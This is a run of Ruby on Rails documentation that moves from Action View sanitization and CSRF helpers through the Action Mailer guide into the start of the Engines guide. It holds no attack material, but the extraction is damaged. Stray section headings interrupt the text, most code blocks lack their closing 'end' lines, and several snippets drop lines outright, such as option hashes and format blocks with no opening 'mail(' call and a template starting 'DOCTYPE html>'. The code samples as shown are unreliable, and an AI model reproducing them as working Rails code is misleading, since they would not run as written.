  config.action_view.sanitized_allowed_tags = 'table', 'tr', 'td'
#### sanitize_css(style)
Sanitizes a block of CSS code.
#### strip_links(html)
Strips all link tags from text leaving just the link text.
strip_links("<a href="http://rubyonrails.org">Ruby on Rails</a>")
# => Ruby on Rails
strip_links("emails to <a href="mailto:me@email.com">me@email.com</a>.")
# => emails to me@email.com.
strip_links('Blog: <a href="http://myblog.com/">Visit</a>.')
# => Blog: Visit.
#### strip_tags(html)
Strips all HTML tags from the html, including comments.
This uses the html-scanner tokenizer and so its HTML parsing ability is limited by that of html-scanner.
strip_tags("Strip <i>these</i> tags!")
# => Strip these tags!
strip_tags("<b>Bold</b> no more!  
<a href='more.html'>See more</a>")
# => Bold no more!  
See more
NB: The output may still contain unescaped '<', '>', '&' characters and confuse browsers.
### CsrfHelper
Returns meta tags "csrf-param" and "csrf-token" with the name of the cross-site<n>request forgery protection parameter and token, respectively.
<%= csrf_meta_tags %>
NOTE: Regular forms generate hidden fields so they do not use these tags. 
Localized Views
Action View has the ability render different templates depending on the current locale.
I18n.locale = :de
If the localized template isn't present, the undecorated version will be used. 
This means you're not required to provide localized views for all cases, but they will be preferred and used if available.
You can use the same technique to localize the rescue files in your public directory. 
For example, setting `I18n.locale = :de` and creating `public/500.de.html` and `public/404.de.html` would allow you to have localized rescue pages.
Since Rails doesn't restrict the symbols that you use to set I18n.locale, you can leverage this system to display different content depending on anything you like. 
For example, suppose you have some "expert" users that should see different pages from "normal" users. 
You could add the following to `app/controllers/application.rb`:
before_action :set_expert_locale
def set_expert_locale
  I18n.locale = :expert if current_user.expert?
You can read more about the Rails Internationalization (I18n) API [here](i18n.html).
Active Support
-------
Action View
  date:
Railties
Action Mailer Basics
This guide provides you with all you need to get started in sending and<n>receiving emails from and to your application, and many internals of Action<n>Mailer. 
It also covers how to test your mailers.
* How to send and receive email within a Rails application.
* How to generate and edit an Action Mailer class and mailer view.
* How to configure Action Mailer for your environment.
* How to test your Action Mailer classes.
Action Mailer allows you to send emails from your application using mailer classes<n>and views. 
Mailers work very similarly to controllers. 
They inherit from<n>`ActionMailer::Base` and live in `app/mailers`, and they have associated views<n>that appear in `app/views`.
Sending Emails
This section will provide a step-by-step guide to creating a mailer and its<n>views.
### Walkthrough to Generating a Mailer
#### Create the Mailer
$ bin/rails generate mailer UserMailer
create  app/mailers/user_mailer.rb
create  app/mailers/application_mailer.rb
invoke  erb
create    app/views/user_mailer
create    app/views/layouts/mailer.text.erb
create    app/views/layouts/mailer.html.erb
invoke  test_unit
create    test/mailers/user_mailer_test.rb
create    test/mailers/previews/user_mailer_preview.rb
# app/mailers/application_mailer.rb
class ApplicationMailer < ActionMailer::Base
  default from: "from@example.com"
  layout 'mailer'
# app/mailers/user_mailer.rb
class UserMailer < ApplicationMailer
As you can see, you can generate mailers just like you use other generators with<n>Rails. 
Mailers are conceptually similar to controllers, and so we get a mailer,<n>a directory for views, and a test.
If you didn't want to use a generator, you could create your own file inside of<n>app/mailers, just make sure that it inherits from `ActionMailer::Base`:
class MyMailer < ActionMailer::Base
#### Edit the Mailer
Mailers are very similar to Rails controllers. 
They also have methods called<n>"actions" and use views to structure the content. 
Where a controller generates<n>content like HTML to send back to the client, a Mailer creates a message to be<n>delivered via email.
`app/mailers/user_mailer.rb` contains an empty mailer:
Let's add a method called `welcome_email`, that will send an email to the user's<n>registered email address:
  default from: 'notifications@example.com'
  def welcome_email(user)
    @user = user
    @url  = 'http://example.com/login'
    mail(to: @user.email, subject: 'Welcome to My Awesome Site')
Here is a quick explanation of the items presented in the preceding method. 
For<n>a full list of all available options, please have a look further down at the<n>Complete List of Action Mailer user-settable attributes section.
* `default Hash` - This is a hash of default values for any email you send from<n>this mailer. 
In this case we are setting the `:from` header to a value for all<n>messages in this class. 
This can be overridden on a per-email basis.
* `mail` - The actual email message, we are passing the `:to` and `:subject`<n>headers in.
Just like controllers, any instance variables we define in the method become<n>available for use in the views.
#### Create a Mailer View
Create a file called `welcome_email.html.erb` in `app/views/user_mailer/`. 
This<n>will be the template used for the email, formatted in HTML:
DOCTYPE html>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <h1>Welcome to example.com, <%= @user.name %></h1>
    <p>
      You have successfully signed up to example.com,
      your username is: <%= @user.login %>.<br>
    </p>
      To login to the site, just follow this link: <%= @url %>.
    <p>Thanks for joining and have a great day!
Let's also make a text part for this email. 
Not all clients prefer HTML emails,<n>and so sending both is best practice. 
To do this, create a file called<n>`welcome_email.text.erb` in `app/views/user_mailer/`:
Welcome to example.com, <%= @user.name %>
===============================================
You have successfully signed up to example.com,<n>your username is: <%= @user.login %>.
To login to the site, just follow this link: <%= @url %>.
Thanks for joining and have a great day!
When you call the `mail` method now, Action Mailer will detect the two templates<n>(text and HTML) and automatically generate a `multipart/alternative` email.
#### Calling the Mailer
Mailers are really just another way to render a view. 
Instead of rendering a<n>view and sending out the HTTP protocol, they are just sending it out through the<n>email protocols instead. 
Due to this, it makes sense to just have your<n>controller tell the Mailer to send an email when a user is successfully created.
Setting this up is painfully simple.
First, let's create a simple `User` scaffold:
$ bin/rails generate scaffold user name email login
$ bin/rake db:migrate
Now that we have a user model to play with, we will just edit the<n>`app/controllers/users_controller.rb` make it instruct the `UserMailer` to deliver<n>an email to the newly created user by editing the create action and inserting a<n>call to `UserMailer.welcome_email` right after the user is successfully saved.
Action Mailer is nicely integrated with Active Job so you can send emails outside<n>of the request-response cycle, so the user doesn't have to wait on it:
  # POST /users
  # POST /users.json
        # Tell the UserMailer to send a welcome email after save
        UserMailer.welcome_email(@user).deliver_later
        format.html { redirect_to(@user, notice: 'User was successfully created.') 
        format.html { render action: 'new' }
NOTE: Active Job's default behavior is to execute jobs ':inline'. 
So, you can use<n>`deliver_later` now to send emails, and when you later decide to start sending<n>them from a background job, you'll only need to set up Active Job to use a queueing<n>backend (Sidekiq, Resque, etc).
If you want to send emails right away (from a cronjob for example) just call<n>`deliver_now`:
class SendWeeklySummary
  def run
    User.find_each do |user|
      UserMailer.weekly_summary(user).deliver_now
The method `welcome_email` returns a `ActionMailer::MessageDelivery` object which<n>can then just be told `deliver_now` or `deliver_later` to send itself out. 
The<n>`ActionMailer::MessageDelivery` object is just a wrapper around a `Mail::Message`. 
If<n>you want to inspect, alter or do anything else with the `Mail::Message` object you can<n>access it with the `message` method on the `ActionMailer::MessageDelivery` object.
### Auto encoding header values
Action Mailer handles the auto encoding of multibyte characters inside of<n>headers and bodies.
For more complex examples such as defining alternate character sets or<n>self-encoding text first, please refer to the<n>[Mail](https://github.com/mikel/mail) library.
### Complete List of Action Mailer Methods
There are just three methods that you need to send pretty much any email<n>message:
* `headers` - Specifies any header on the email you want. 
You can pass a hash of<n>  header field names and value pairs, or you can call `headers[:field_name] =<n>  'value'`.
* `attachments` - Allows you to add attachments to your email. 
For example,<n>  `attachments['file-name.jpg'] = File.read('file-name.jpg')`.
* `mail` - Sends the actual email itself. 
You can pass in headers as a hash to<n>  the mail method as a parameter, mail will then create an email, either plain<n>  text, or multipart, depending on what email templates you have defined.
#### Adding Attachments
Action Mailer makes it very easy to add attachments.
* Pass the file name and content and Action Mailer and the<n>  [Mail gem](https://github.com/mikel/mail) will automatically guess the<n>  mime_type, set the encoding and create the attachment.
    attachments['filename.jpg'] = File.read('/path/to/filename.jpg')
  When the `mail` method will be triggered, it will send a multipart email with<n>  an attachment, properly nested with the top level being `multipart/mixed` and<n>  the first part being a `multipart/alternative` containing the plain text and<n>  HTML email messages.
NOTE: Mail will automatically Base64 encode an attachment. 
If you want something<n>different, encode your content and pass in the encoded content and encoding in a<n>`Hash` to the `attachments` method.
* Pass the file name and specify headers and content and Action Mailer and Mail<n>  will use the settings you pass in.
    encoded_content = SpecialEncode(File.read('/path/to/filename.jpg'))
    attachments['filename.jpg'] = {
      mime_type: 'application/x-gzip',
      encoding: 'SpecialEncoding',
      content: encoded_content
NOTE: If you specify an encoding, Mail will assume that your content is already<n>encoded and not try to Base64 encode it.
#### Making Inline Attachments
Action Mailer 3.0 makes inline attachments, which involved a lot of hacking in pre 3.0 versions, much simpler and trivial as they should be.
* First, to tell Mail to turn an attachment into an inline attachment, you just call `#inline` on the attachments method within your Mailer:
    def welcome
      attachments.inline['image.jpg'] = File.read('/path/to/image.jpg')
* Then in your view, you can just reference `attachments` as a hash and specify<n>  which attachment you want to show, calling `url` on it and then passing the<n>  result into the `image_tag` method:
    ```html+erb
    <p>Hello there, this is our image</p>
    <%= image_tag attachments['image.jpg'].url %>
* As this is a standard call to `image_tag` you can pass in an options hash<n>  after the attachment URL as you could for any other image:
    <%= image_tag attachments['image.jpg'].url, alt: 'My Photo', class: 'photos' %>
#### Sending Email To Multiple Recipients
It is possible to send email to one or more recipients in one email (e.g.,<n>informing all admins of a new signup) by setting the list of emails to the `:to`<n>key. 
The list of emails can be an array of email addresses or a single string<n>with the addresses separated by commas.
class AdminMailer < ActionMailer::Base
  default to: Proc.new { Admin.pluck(:email) },
          from: 'notification@example.com'
  def new_registration(user)
    mail(subject: "New User Signup: #{@user.email}")
The same format can be used to set carbon copy (Cc:) and blind carbon copy<n>(Bcc:) recipients, by using the `:cc` and `:bcc` keys respectively.
#### Sending Email With Name
Sometimes you wish to show the name of the person instead of just their email<n>address when they receive the email. 
The trick to doing that is to format the<n>email address in the format `"Full Name <email>"`.
def welcome_email(user)
  @user = user
  email_with_name = %("#{@user.name}" <#{@user.email}>)
  mail(to: email_with_name, subject: 'Welcome to My Awesome Site')
### Mailer Views
Mailer views are located in the `app/views/name_of_mailer_class` directory. 
The<n>specific mailer view is known to the class because its name is the same as the<n>mailer method. 
In our example from above, our mailer view for the<n>`welcome_email` method will be in `app/views/user_mailer/welcome_email.html.erb`<n>for the HTML version and `welcome_email.text.erb` for the plain text version.
To change the default mailer view for your action you do something like:
    mail(to: @user.email,
         subject: 'Welcome to My Awesome Site',
         template_path: 'notifications',
         template_name: 'another')
In this case it will look for templates at `app/views/notifications` with name<n>`another`.  
You can also specify an array of paths for `template_path`, and they<n>will be searched in order.
If you want more flexibility you can also pass a block and render specific<n>templates or even render inline or text without using a template file:
         subject: 'Welcome to My Awesome Site') do |format|
      format.html { render 'another_template' }
      format.text { render text: 'Render text' }
This will render the template 'another_template.html.erb' for the HTML part and<n>use the rendered text for the text part. 
The render command is the same one used<n>inside of Action Controller, so you can use all the same options, such as<n>`:text`, `:inline` etc.
### Action Mailer Layouts
Just like controller views, you can also have mailer layouts. 
The layout name<n>needs to be the same as your mailer, such as `user_mailer.html.erb` and<n>`user_mailer.text.erb` to be automatically recognized by your mailer as a<n>layout.
In order to use a different file, call `layout` in your mailer:
  layout 'awesome' # use awesome.(html|text).erb as the layout
Just like with controller views, use `yield` to render the view inside the<n>layout.
You can also pass in a `layout: 'layout_name'` option to the render call inside<n>the format block to specify different layouts for different formats:
    mail(to: user.email) do |format|
      format.html { render layout: 'my_layout' }
      format.text
Will render the HTML part using the `my_layout.html.erb` file and the text part<n>with the usual `user_mailer.text.erb` file if it exists.
### Generating URLs in Action Mailer Views
Unlike controllers, the mailer instance doesn't have any context about the<n>incoming request so you'll need to provide the `:host` parameter yourself.
As the `:host` usually is consistent across the application you can configure it<n>globally in `config/application.rb`:
config.action_mailer.default_url_options = { host: 'example.com' }
Because of this behavior you cannot use any of the `*_path` helpers inside of<n>an email. 
Instead you will need to use the associated `*_url` helper. 
For example<n>instead of using
<%= link_to 'welcome', welcome_path %>
You will need to use:
<%= link_to 'welcome', welcome_url %>
By using the full URL, your links will now work in your emails.
#### generating URLs with `url_for`
If you did not configure the `:host` option globally make sure to pass it to<n>`url_for`.
<%= url_for(host: 'example.com',
            controller: 'welcome',
            action: 'greeting') %>
#### generating URLs with named routes
Email clients have no web context and so paths have no base URL to form complete<n>web addresses. 
Thus, you should always use the "_url" variant of named route<n>helpers.
If you did not configure the `:host` option globally make sure to pass it to the<n>url helper.
<%= user_url(@user, host: 'example.com') %>
### Sending Multipart Emails
Action Mailer will automatically send multipart emails if you have different<n>templates for the same action. 
So, for our UserMailer example, if you have<n>`welcome_email.text.erb` and `welcome_email.html.erb` in<n>`app/views/user_mailer`, Action Mailer will automatically send a multipart email<n>with the HTML and text versions setup as different parts.
The order of the parts getting inserted is determined by the `:parts_order`<n>inside of the `ActionMailer::Base.default` method.
### Sending Emails with Dynamic Delivery Options
If you wish to override the default delivery options (e.g. SMTP credentials)<n>while delivering emails, you can do this using `delivery_method_options` in the<n>mailer action.
  def welcome_email(user, company)
    @url  = user_url(@user)
    delivery_options = { user_name: company.smtp_user,
                         password: company.smtp_password,
                         address: company.smtp_host }
         subject: "Please see the Terms and Conditions attached",
         delivery_method_options: delivery_options)
### Sending Emails without Template Rendering
There may be cases in which you want to skip the template rendering step and<n>supply the email body as a string. 
You can achieve this using the `:body`<n>option. 
In such cases don't forget to add the `:content_type` option. 
Rails<n>will default to `text/plain` otherwise.
  def welcome_email(user, email_body)
    mail(to: user.email,
         body: email_body,
         content_type: "text/html",
         subject: "Already rendered!")
Receiving Emails
Receiving and parsing emails with Action Mailer can be a rather complex<n>endeavor. 
Before your email reaches your Rails app, you would have had to<n>configure your system to somehow forward emails to your app, which needs to be<n>listening for that. 
So, to receive emails in your Rails app you'll need to:
* Implement a `receive` method in your mailer.
* Configure your email server to forward emails from the address(es) you would<n>  like your app to receive to `/path/to/app/bin/rails runner<n>  'UserMailer.receive(STDIN.read)'`.
Once a method called `receive` is defined in any mailer, Action Mailer will<n>parse the raw incoming email into an email object, decode it, instantiate a new<n>mailer, and pass the email object to the mailer `receive` instance<n>method. 
Here's an example:
  def receive(email)
    page = Page.find_by(address: email.to.first)
    page.emails.create(
      subject: email.subject,
      body: email.body
    )
    if email.has_attachments?
      email.attachments.each do |attachment|
        page.attachments.create({
          file: attachment,
          description: email.subject
        })
Action Mailer Callbacks
Action Mailer allows for you to specify a `before_action`, `after_action` and<n>`around_action`.
* Filters can be specified with a block or a symbol to a method in the mailer<n>  class similar to controllers.
* You could use a `before_action` to populate the mail object with defaults,<n>  delivery_method_options or insert default headers and attachments.
* You could use an `after_action` to do similar setup as a `before_action` but<n>  using instance variables set in your mailer action.
  after_action :set_delivery_options,
               :prevent_delivery_to_guests,
               :set_business_headers
  def feedback_message(business, user)
    @business = business
    mail
  def campaign_message(business, user)
  private
    def set_delivery_options
      # You have access to the mail instance,
      # @business and @user instance variables here
      if @business && @business.has_smtp_settings?
        mail.delivery_method.settings.merge!(
    def prevent_delivery_to_guests
      if @user && @user.guest?
        mail.perform_deliveries = false
    def set_business_headers
      if @business
        headers["X-SMTPAPI-CATEGORY"] = @business.code
* Mailer Filters abort further processing if body is set to a non-nil value.
Using Action Mailer Helpers
Action Mailer now just inherits from `AbstractController`, so you have access to<n>the same generic helpers as you do in Action Controller.
Action Mailer Configuration
The following configuration options are best made in one of the environment<n>files (environment.rb, production.rb, etc...)
| Configuration | Description |
|---------------|-------------|
|`logger`|Generates information on the mailing run if available. 
Can be set to `nil` for no logging. 
Compatible with both Ruby's own `Logger` and `Log4r` loggers.
|`smtp_settings`|Allows detailed configuration for `:smtp` delivery method:
<ul><li>`:address` - Allows you to use a remote mail server. 
Just change it from its default `"localhost"` setting.</li>
<li>`:port` - On the off chance that your mail server doesn't run on port 25, you can change it.</li>
<li>`:domain` - If you need to specify a HELO domain, you can do it here.</li>
<li>`:user_name` - If your mail server requires authentication, set the username in this setting.</li>
<li>`:password` - If your mail server requires authentication, set the password in this setting.</li>
<li>`:authentication` - If your mail server requires authentication, you need to specify the authentication type here. 
|`sendmail_settings`|Allows you to override options for the `:sendmail` delivery method.
<ul><li>`:location` - The location of the sendmail executable. 
Defaults to `/usr/sbin/sendmail`.</li>
<li>`:arguments` - The command line arguments to be passed to sendmail. 
Defaults to `-i -t`.</li></ul>|
|`raise_delivery_errors`|Whether or not errors should be raised if the email fails to be delivered. 
This only works if the external email server is configured for immediate delivery.
|`delivery_method`|Defines a delivery method. 
Possible values are:<ul>
<li>`:smtp` (default), can be configured by using `config.action_mailer.smtp_settings`.</li>
<li>`:sendmail`, can be configured by using `config.action_mailer.sendmail_settings`.</li>
<li>`:file`: save emails to files; can be configured by using `config.action_mailer.file_settings`.</li>
<li>`:test`: save emails to `ActionMailer::Base.deliveries` array.</li>
</ul>See [API docs](http://api.rubyonrails.org/classes/ActionMailer/Base.html) for more info.
|`perform_deliveries`|Determines whether deliveries are actually carried out when the `deliver` method is invoked on the Mail message. 
By default they are, but this can be turned off to help functional testing.
|`deliveries`|Keeps an array of all the emails sent out through the Action Mailer with delivery_method :test. 
Most useful for unit and functional testing.
|`default_options`|Allows you to set default values for the `mail` method options (`:from`, `:reply_to`, etc.).
For a complete writeup of possible configurations see the<n>[Configuring Action Mailer](configuring.html#configuring-action-mailer) in<n>our Configuring Rails Applications guide.
### Example Action Mailer Configuration
An example would be adding the following to your appropriate<n>`config/environments/$RAILS_ENV.rb` file:
config.action_mailer.delivery_method = :sendmail
# Defaults to:
# config.action_mailer.sendmail_settings = {
#   location: '/usr/sbin/sendmail',
#   arguments: '-i -t'
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true
config.action_mailer.default_options = {from: 'no-reply@example.com'}
### Action Mailer Configuration for Gmail
As Action Mailer now uses the [Mail gem](https://github.com/mikel/mail), this<n>becomes as simple as adding to your `config/environments/$RAILS_ENV.rb` file:
config.action_mailer.delivery_method = :smtp
config.action_mailer.smtp_settings = {
  address:              'smtp.gmail.com',
  port:                 587,
  domain:               'example.com',
  user_name:            '<username>',
  password:             '<password>',
  authentication:       'plain',
  enable_starttls_auto: true  }
Mailer Testing
You can find detailed instructions on how to test your mailers in the<n>[testing guide](testing.html#testing-your-mailers).
Intercepting Emails
-------------------
There are situations where you need to edit an email before it's<n>delivered. 
Fortunately Action Mailer provides hooks to intercept every<n>email. 
You can register an interceptor to make modifications to mail messages<n>right before they are handed to the delivery agents.
class SandboxEmailInterceptor
  def self.delivering_email(message)
    message.to = ['sandbox@example.com']
Before the interceptor can do its job you need to register it with the Action<n>Mailer framework. 
You can do this in an initializer file<n>`config/initializers/sandbox_email_interceptor.rb`
NOTE: The example above uses a custom environment called "staging" for a<n>production like server but for testing purposes. 
You can read<n>[Creating Rails environments](configuring.html#creating-rails-environments)<n>for more information about custom Rails environments.
Getting Started with Engines
In this guide you will learn about engines and how they can be used to provide<n>additional functionality to their host applications through a clean and very<n>easy-to-use interface.
* What makes an engine.
* How to generate an engine.
* Building features for the engine.
* Hooking the engine into an application.
* Overriding engine functionality in the application.
What are engines?
Engines can be considered miniature applications that provide functionality to<n>their host applications. 
A Rails application is actually just a "supercharged"<n>engine, with the `Rails::Application` class inheriting a lot of its behavior<n>from `Rails::Engine`.
Therefore, engines and applications can be thought of almost the same thing,<n>just with subtle differences, as you'll see throughout this guide. 
Engines and<n>applications also share a common structure.
Engines are also closely related to plugins. 
The two share a common `lib`<n>directory structure, and are both generated using the `rails plugin new`<n>generator. 
The difference is that an engine is considered a "full plugin" by<n>Rails (as indicated by the `--full` option that's passed to the generator<n>command). 
We'll actually be using the `--mountable` option here, which includes<n>all the features of `--full`, and then some. 
This guide will refer to these<n>"full plugins" simply as "engines" throughout. 
An engine **can** be a plugin,<n>and a plugin **can** be an engine.
The engine that will be created in this guide will be called "blorgh". 
This<n>engine will provide blogging functionality to its host applications, allowing<n>for new articles and comments to be created. 
At the beginning of this guide, you<n>will be working solely within the engine itself, but in later sections you'll<n>see how to hook it into an application.
Engines can also be isolated from their host applications. 
This means that an<n>application is able to have a path provided by a routing helper such as<n>`articles_path` and use an engine also that provides a path also called<n>`articles_path`, and the two would not clash. 
Along with this, controllers, models<n>and table names are also namespaced. 
You'll see how to do this later in this<n>guide.
It's important to keep in mind at all times that the application should<n>**always** take precedence over its engines. 
An application is the object that<n>has final say in what goes on in its environment. 
The engine should<n>only be enhancing it, rather than changing it drastically.
To see demonstrations of other engines, check out<n>[Devise](https://github.com/plataformatec/devise), an engine that provides<n>authentication for its parent applications, or<n>[Forem](https://github.com/radar/forem), an engine that provides forum<n>functionality. 
There's also [Spree](https://github.com/spree/spree) which<n>provides an e-commerce platform, and<n>[RefineryCMS](https://github.com/refinery/refinerycms), a CMS engine.
Finally, engines would not have been possible without the work of James Adam,<n>Piotr Sarnacki, the Rails Core Team, and a number of other people. 
If you ever<n>meet them, don't forget to say thanks!
Generating an engine
To generate an engine, you will need to run the plugin generator and pass it<n>options as appropriate to the need. 
For the "blorgh" example, you will need to<n>create a "mountable" engine, running this command in a terminal:
The full list of options for the plugin generator may be seen by typing:
The `--mountable` option tells the generator that you want to create a<n>"mountable" and namespace-isolated engine. 
This generator will provide the same<n>skeleton structure as would the `--full` option. 
The `--full` option tells the<n>generator that you want to create an engine, including a skeleton structure<n>that provides the following:
  * An `app` directory tree
  * A `config/routes.rb` file:
    Rails.application.routes.draw do
  * A file at `lib/blorgh/engine.rb`, which is identical in function to a<n>    standard Rails application's `config/application.rb` file:
    module Blorgh
      class Engine < ::Rails::Engine
    end
The `--mountable` option will add to the `--full` option:
  * Asset manifest files (`application.js` and `application.css`)
  * A namespaced `ApplicationController` stub
  * A namespaced `ApplicationHelper` stub
  * A layout view template for the engine
  * Namespace isolation to `config/routes.rb`:
    Blorgh::Engine.routes.draw do
  * Namespace isolation to `lib/blorgh/engine.rb`:
        isolate_namespace Blorgh
Additionally, the `--mountable` option tells the generator to mount the engine<n>inside the dummy testing application located at `test/dummy` by adding the<n>following to the dummy application's routes file at<n>`test/dummy/config/routes.rb`:
mount Blorgh::Engine => "/blorgh"
### Inside an Engine
#### Critical Files
At the root of this brand new engine's directory lives a `blorgh.gemspec` file.<n>
When you include the engine into an application later on, you will do so with<n>this line in the Rails application's `Gemfile`:
gem 'blorgh', path: "vendor/engines/blorgh"
Don't forget to run `bundle install` as usual. 
By specifying it as a gem within<n>the `Gemfile`, Bundler will load it as such, parsing this `blorgh.gemspec` file<n>and requiring a file within the `lib` directory called `lib/blorgh.rb`. 
This<n>file requires the `blorgh/engine.rb` file (located at `lib/blorgh/engine.rb`)<n>and defines a base module called `Blorgh`.
require "blorgh/engine"
module Blorgh
TIP: Some engines choose to use this file to put global configuration options<n>for their engine. 
It's a relatively good idea, so if you want to offer<n>configuration options, the file where your engine's `module` is defined is<n>perfect for that. 
Place the methods inside the module and you'll be good to go.
Within `lib/blorgh/engine.rb` is the base class for the engine:
  class Engine < ::Rails::Engine
    isolate_namespace Blorgh
By inheriting from the `Rails::Engine` class, this gem notifies Rails that<n>there's an engine at the specified path, and will correctly mount the engine<n>inside the application, performing tasks such as adding the `app` directory of<n>the engine to the load path for models, mailers, controllers and views.
The `isolate_namespace` method here deserves special notice. 
This call is<n>responsible for isolating the controllers, models, routes and other things into<n>their own namespace, away from similar components inside the application.<n>
Without this, there is a possibility that the engine's components could "leak"<n>into the application, causing unwanted disruption, or that important engine<n>components could be overridden by similarly named things within the application.<n>
One of the examples of such conflicts is helpers. 
Without calling<n>`isolate_namespace`, the engine's helpers would be included in an application's<n>controllers.
NOTE: It is **highly** recommended that the `isolate_namespace` line be left<n>within the `Engine` class definition. 
Without it, classes generated in an engine<n>**may** conflict with an application.
What this isolation of the namespace means is that a model generated by a call<n>to `bin/rails g model`, such as `bin/rails g model article`, won't be called `Article`, but<n>instead be namespaced and called `Blorgh::Article`. 
In addition, the table for the<n>model is namespaced, becoming `blorgh_articles`, rather than simply `articles`.<n>
Similar to the model namespacing, a controller called `ArticlesController` becomes<n>`Blorgh::ArticlesController` and the views for that controller will not be at<n>`app/views/articles`, but `app/views/blorgh/articles` instead. 
Mailers are namespaced<n>as well.
Finally, routes will also be isolated within the engine. 
This is one of the most<n>important parts about namespacing, and is discussed later in the<n>[Routes](#routes) section of this guide.
#### `app` Directory
Inside the `app` directory are the standard `assets`, `controllers`, `helpers`,<n>`mailers`, `models` and `views` directories that you should be familiar with<n>from an application. 
The `helpers`, `mailers` and `models` directories are<n>empty, so they aren't described in this section. 
We'll look more into models in<n>a future section, when we're writing the engine.
Within the `app/assets` directory, there are the `images`, `javascripts` and<n>`stylesheets` directories which, again, you should be familiar with due to their<n>similarity to an application. 
One difference here, however, is that each<n>directory contains a sub-directory with the engine name. 
Because this engine is<n>going to be namespaced, its assets should be too.
Within the `app/controllers` directory there is a `blorgh` directory that<n>contains a file called `application_controller.rb`. 
This file will provide any<n>common functionality for the controllers of the engine. 
The `blorgh` directory<n>is where the other controllers for the engine will go. 
By placing them within<n>this namespaced directory, you prevent them from possibly clashing with<n>identically-named controllers within other engines or even within the<n>application.
NOTE: The `ApplicationController` class inside an engine is named just like a<n>Rails application in order to make it easier for you to convert your<n>applications into engines.
Lastly, the `app/views` directory contains a `layouts` folder, which contains a<n>file at `blorgh/application.html.erb`. 
This file allows you to specify a layout<n>for the engine. 
If this engine is to be used as a stand-alone engine, then you<n>would add any customization to its layout in this file, rather than the<n>application's `app/views/layouts/application.html.erb` file.
If you don't want to force a layout on to users of the engine, then you can<n>delete this file and reference a different layout in the controllers of your<n>engine.
#### `bin` Directory
This directory contains one file, `bin/rails`, which enables you to use the<n>`rails` sub-commands and generators just like you would within an application.<n>
This means that you will be able to generate new controllers and models for this<n>engine very easily by running commands like this:
$ bin/rails g model
Keep in mind, of course, that anything generated with these commands inside of<n>an engine that has `isolate_namespace` in the `Engine` class will be namespaced.
#### `test` Directory
The `test` directory is where tests for the engine will go. 
To test the engine,<n>there is a cut-down version of a Rails application embedded within it at<n>`test/dummy`. 
This application will mount the engine in the<n>`test/dummy/config/routes.rb` file:
  mount Blorgh::Engine => "/blorgh"
This line mounts the engine at the path `/blorgh`, which will make it accessible<n>through the application only at that path.
Inside the test directory there is the `test/integration` directory, where<n>integration tests for the engine should be placed. 
Other directories can be<n>created in the `test` directory as well. 
For example, you may wish to create a<n>`test/models` directory for your model tests.
Providing engine functionality
The engine that this guide covers provides submitting articles and commenting<n>functionality and follows a similar thread to the [Getting Started<n>Guide](getting_started.html), with some new twists.
### Generating an Article Resource
The first thing to generate for a blog engine is the `Article` model and related<n>controller. 
To quickly generate this, you can use the Rails scaffold generator.
$ bin/rails generate scaffold article title:string text:text
This command will output this information:
invoke  active_record
create    db/migrate/[timestamp]_create_blorgh_articles.rb
create    app/models/blorgh/article.rb
invoke    test_unit
create      test/models/blorgh/article_test.rb
create      test/fixtures/blorgh/articles.yml
invoke  resource_route
    resources :articles
invoke  scaffold_controller
create    app/controllers/blorgh/articles_controller.rb
invoke    erb
create      app/views/blorgh/articles
create      app/views/blorgh/articles/index.html.erb
create      app/views/blorgh/articles/edit.html.erb
create      app/views/blorgh/articles/show.html.erb
create      app/views/blorgh/articles/new.html.erb
create      app/views/blorgh/articles/_form.html.erb
create      test/controllers/blorgh/articles_controller_test.rb
invoke    helper
create      app/helpers/blorgh/articles_helper.rb
invoke  assets
invoke    js
create      app/assets/javascripts/blorgh/articles.js
invoke    css
create      app/assets/stylesheets/blorgh/articles.css
invoke  css
create    app/assets/stylesheets/scaffold.css
The first thing that the scaffold generator does is invoke the `active_record`<n>generator, which generates a migration and a model for the resource. 
Note here,<n>however, that the migration is called `create_blorgh_articles` rather than the<n>usual `create_articles`. 
This is due to the `isolate_namespace` method called in<n>the `Blorgh::Engine` class's definition. 
The model here is also namespaced,<n>being placed at `app/models/blorgh/article.rb` rather than `app/models/article.rb` due<n>to the `isolate_namespace` call within the `Engine` class.
Next, the `test_unit` generator is invoked for this model, generating a model<n>test at `test/models/blorgh/article_test.rb` (rather than<n>`test/models/article_test.rb`) and a fixture at `test/fixtures/blorgh/articles.yml`<n>(rather than `test/fixtures/articles.yml`).
After that, a line for the resource is inserted into the `config/routes.rb` file<n>for the engine. 
This line is simply `resources :articles`, turning the<n>`config/routes.rb` file for the engine into this:
Blorgh::Engine.routes.draw do
  resources :articles
Note here that the routes are drawn upon the `Blorgh::Engine` object rather than<n>the `YourApp::Application` class. 
This is so that the engine routes are confined<n>to the engine itself and can be mounted at a specific point as shown in the<n>[test directory](#test-directory) section. 
It also causes the engine's routes to<n>be isolated from those routes that are within the application. 
The<n>[Routes](#routes) section of this guide describes it in detail.
Next, the `scaffold_controller` generator is invoked, generating a controller<n>called `Blorgh::ArticlesController` (at<n>`app/controllers/blorgh/articles_controller.rb`) and its related views at<n>`app/views/blorgh/articles`. 
Everything this generator has created is neatly namespaced. 
The controller's<n>class is defined within the `Blorgh` module:
  class ArticlesController < ApplicationController
    ...
NOTE: The `ApplicationController` class being inherited from here is the<n>`Blorgh::ApplicationController`, not an application's `ApplicationController`.
The helper inside `app/helpers/blorgh/articles_helper.rb` is also namespaced:
  module ArticlesHelper
This helps prevent conflicts with any other engine or application that may have<n>an article resource as well.
Finally, the assets for this resource are generated in two files:
`app/assets/javascripts/blorgh/articles.js` and
`app/assets/stylesheets/blorgh/articles.css`. 
You'll see how to use these a little<n>later.
By default, the scaffold styling is not applied to the engine because the<n>engine's layout file, `app/views/layouts/blorgh/application.html.erb`, doesn't<n>load it. 
To make the scaffold styling apply, insert this line into the `<head>`<n>tag of this layout:
<%= stylesheet_link_tag "scaffold" %>
You can see what the engine has so far by running `rake db:migrate` at the root<n>of our engine to run the migration generated by the scaffold generator, and then<n>running `rails server` in `test/dummy`. 
When you open<n>`http://localhost:3000/blorgh/articles` you will see the default scaffold that has<n>been generated. 
Click around! 
You've just generated your first engine's first<n>functions.
If you'd rather play around in the console, `rails console` will also work just<n>like a Rails application. 
Remember: the `Article` model is namespaced, so to<n>reference it you must call it as `Blorgh::Article`.
>> Blorgh::Article.find(1)
=> #<Blorgh::Article id: 1 ...
One final thing is that the `articles` resource for this engine should be the root<n>of the engine. 
Whenever someone goes to the root path where the engine is<n>mounted, they should be shown a list of articles. 
